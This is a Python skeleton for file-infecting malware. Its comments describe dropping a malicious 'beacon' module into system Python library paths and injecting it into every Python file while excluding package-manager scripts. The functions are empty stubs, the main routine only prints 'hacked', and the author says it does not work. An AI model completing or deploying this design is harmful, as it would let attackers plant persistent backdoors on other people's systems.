"""
Iterate through the file system and inject code into all python files
@author: degenerat3
disclaimer: this doesn't fkn work
"""

MODULE_CODE = "beacon.py"           # The malicious module source code file
DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into /usr/lib/...
MODULE_FUNCTION = "changeme"        # The function from the module that will be injected/run by infected files
EXCLUDE_LIST = ["/path/to/yum.py", "/path/to/dnf.py" ]  # A comprehensive list of files we won't infect


def read_beacon_code(filename):
    # TODO: Extract the code from the zipfile here
    
    # Until then, just read from the file directly
    with open(filename) as fil:
        contents = fil.read()
    return contents


def drop_module(dest_file_path):
    """
    Write the malicious module to the given path (likely /usr/lib/pythonX)
    @param dest_file_path: The destination of the malicious module
    @return: none
    """


def find_py(pth):
    """
    Iterate through the given path and find all python files
    @param pth: the starting directory to search
    @return: an array of URIs of python files to infect
    """

    return []


def infect_file(file_path):
    """
    Import the malicious module and add the malicious function to the given file
    @param file_path: the URI of the file to infect
    @return: none
    """

def infect():
    """
    The main function of the script; drops module and infects files
    """
    print("hacked")

infect()